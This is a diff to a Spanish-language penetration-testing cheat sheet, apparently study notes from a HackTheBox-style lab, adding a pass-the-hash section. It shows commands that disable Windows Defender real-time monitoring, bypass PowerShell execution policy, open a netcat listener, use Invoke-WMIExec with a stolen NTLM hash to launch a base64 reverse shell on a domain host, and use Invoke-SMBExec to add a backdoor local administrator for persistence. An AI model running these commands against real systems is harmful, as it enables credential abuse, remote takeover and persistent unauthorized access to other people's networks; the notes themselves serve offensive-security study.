@@ -36,8 +36,9 @@ Si el firewall bloquea podemos usar el puerto 443 por ejemplo ya que este no sue
 ### Windows
 #Maquina_victima_Windows 
 ```CMD
-FILTRADO POR EL FIREWALL
+El bueno es de revshells el powershell#3 (Base64) con shell "powershell"
 ```
+COMPROBAR POR QUE SE BORRO Y HE COGIDO UNA RANDOM
 
 #Maquina_atacante 
 ```
@@ -50,6 +51,41 @@ Si estamos en una maquina Windows podemos desactivarlo con:
 ```PowerShell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
+### Para una reverse entre windows
+#PassTheHash #Stealth
+Vamos a utilizar una técnica muy curiosa importando en powershell el modulo de "Invoke-TheHash" vamos a verlo. Todo esto es una manera un tanto compleja para poder hacer algo que podemos hacerlo más fácil pero para hacer menos ruido y por si desde nuestra kali no llegamos a esa red por algún bloqueo del firewall mola mucho.
+
+	Requisitos
+
+* Necesitamos el hash del usuario el cual este en "usuarios de gestión remota" o admin local en la maquina que queremos 
+* Poder usar una powershell en una maquina del dominio
+* Poder importar el modulo "Invoke-TheHash.psd1"
+Poder importar nc.exe
+
+Primero nos metemos en una powershell de cualquier manera que podemos y ejecutamos el flujo:
+```powershell
+powershell -ep bypass
+
+Import-Module .\Invoke-TheHash.psd1
+``` 
+Con esto y teniendo movido los archivos nombrados anteriormente vamos a hacer el ataque en dos terminales separadas:
+1:
+```cmd
+.\nc.exe -nlvp [PUERTO]
+```
+
+2:
+```powershell
+Invoke-WMIExec -Target [IP_O_NOMBRE_TARGET(ej:DC01)] -Domain [DOMINIO.LOCAL] -Username [USER_VICTIMA] -Hash [HASH_VICTIMA] -Command "[REVERSE SHELL#3 BASE64 DE REVSHELLS]"
+```
+
+Y con esto obtendríamos la shell en la máquina victima con la sesión del usuario que hemos robado
+
+Invoke-TheHash tambien tiene cosas interesantes como el smbexec con el cual si somos admin podriamos hacer cosas como:
+```PowerShell
+Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+```
+Con esto creamos persistencia #Persistencia
 ### Metasploit
 
 Para SMB tenemos el módulo `exploit/windows/smb/psexec`
